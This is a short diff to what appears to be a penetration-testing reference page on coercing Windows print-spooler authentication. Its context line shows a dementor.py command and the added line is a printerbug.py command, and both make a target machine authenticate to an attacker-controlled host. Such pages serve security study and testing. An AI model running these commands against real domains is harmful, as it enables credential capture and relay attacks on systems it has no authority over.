@@ -19,7 +19,7 @@ dementor.py -d $DOMAIN -u $DOMAIN_USER -p $PASSWORD $ATTACKER_IP $TARGET
 Trigger the spooler service
 
 ```bash
-
+printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET' 'ATTACKER HOST'
 ```
 {% endtab %}
 
